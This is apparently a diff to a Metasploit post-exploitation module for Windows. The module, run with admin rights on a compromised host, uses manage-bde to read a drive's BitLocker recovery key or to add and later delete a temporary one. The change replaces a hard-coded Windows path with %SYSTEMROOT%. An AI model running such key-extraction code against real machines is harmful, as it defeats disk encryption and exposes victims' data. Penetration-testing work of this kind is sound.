@@ -5,6 +5,7 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Error
   include Msf::Post::Windows::ExtAPI
   include Msf::Post::Windows::FileInfo
+  include Msf::Post::File
 
   ERROR = Msf::Post::Windows::Error
 
@@ -41,6 +42,7 @@ class Metasploit3 < Msf::Post
     fail_with(Failure::NoAccess, 'You don\'t have administrative privileges') unless is_admin?
 
     drive_letter = datastore['DRIVE_LETTER']
+    system_root = expand_path('%SYSTEMROOT%')
 
     cmd_out = cmd_exec('wmic', "logicaldisk #{drive_letter}: ASSOC:list /assocclass:Win32_LogicalDiskToPartition")
 
@@ -68,7 +70,7 @@ class Metasploit3 < Msf::Post
 
     print_status('Trying to gather a recovery key')
 
-    cmd_out = cmd_exec('C:\\Windows\\sysnative\\manage-bde.exe',
+    cmd_out = cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
                        "-protectors -get #{drive_letter}:")
 
     recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
@@ -78,7 +80,7 @@ class Metasploit3 < Msf::Post
       print_good("Recovery key found : #{recovery_key}")
     else
       print_status('No recovery key found, trying to generate a new recovery key')
-      cmd_out = cmd_exec('C:\\Windows\\sysnative\\manage-bde.exe',
+      cmd_out = cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
                          "-protectors -add #{drive_letter}: -RecoveryPassword")
       recovery_key = cmd_out.match(/((\d{6}-){7}\d{6})/)
       id_key_tmp = cmd_out.match(/(\{[^\}]+\})/)
@@ -114,7 +116,7 @@ class Metasploit3 < Msf::Post
     ensure
       unless id_key_tmp.nil?
         print_status('Deleting temporary recovery key')
-        cmd_exec('C:\\Windows\\sysnative\\manage-bde.exe',
+        cmd_exec("#{system_root}\\sysnative\\manage-bde.exe",
                  "-protectors -delete #{drive_letter}: -id #{id_key_tmp}")
       end
       client.railgun.kernel32.CloseHandle(@handle)
